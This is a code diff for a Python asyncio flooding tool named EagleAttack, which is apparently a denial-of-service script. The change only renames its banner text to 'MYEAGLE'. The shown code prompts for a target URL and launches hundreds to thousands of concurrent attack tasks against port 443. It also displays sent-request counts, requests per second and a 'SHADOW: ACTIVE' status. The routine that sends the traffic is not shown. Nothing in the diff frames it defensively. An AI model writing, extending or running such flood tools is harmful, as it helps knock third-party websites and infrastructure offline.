@@ -44,7 +44,7 @@ class EagleAttack:
             elapsed = time.time() - self.start_time
             rps = round(self.sent / elapsed) if elapsed > 0 else 0
             sys.stdout.write(
-                f"\r{Fore.WHITE}[ {Fore.RED}EAGLE-RAGE {Fore.WHITE}] "
+                f"\r{Fore.WHITE}[ {Fore.RED}MYEAGLE {Fore.WHITE}] "
                 f"SENT: {Fore.GREEN}{self.sent:,} "
                 f"{Fore.WHITE}| RPS: {Fore.YELLOW}{rps:,} "
                 f"{Fore.WHITE}| SHADOW: {Fore.MAGENTA}ACTIVE"
@@ -54,10 +54,10 @@ class EagleAttack:
 
     async def launch(self):
         target = input(f"{Fore.CYAN}Target URL/DOMAIN: {Fore.WHITE}")
-        power = int(input(f"{Fore.CYAN}EAGLE CLUSTERS (Rec: 500-2000): {Fore.WHITE}"))
+        power = int(input(f"{Fore.CYAN}MYEAGLE CLUSTERS (Rec: 500-2000): {Fore.WHITE}"))
         host = target.replace("http://", "").replace("https://", "").split("/")[0]
         path = "/" if "/" not in target.split(host)[-1] else target.split(host)[-1]
-        print(f"\n{Fore.RED}[!] EAGLE ATTACK INITIALIZED. TARGETING INFRASTRUCTURE...")
+        print(f"\n{Fore.RED}[!] MYEAGLE ATTACK INITIALIZED. TARGETING INFRASTRUCTURE...")
         tasks = [asyncio.create_task(self.dashboard())]
         for _ in range(power):
             tasks.append(asyncio.create_task(self.attack_engine(host, 443, path)))
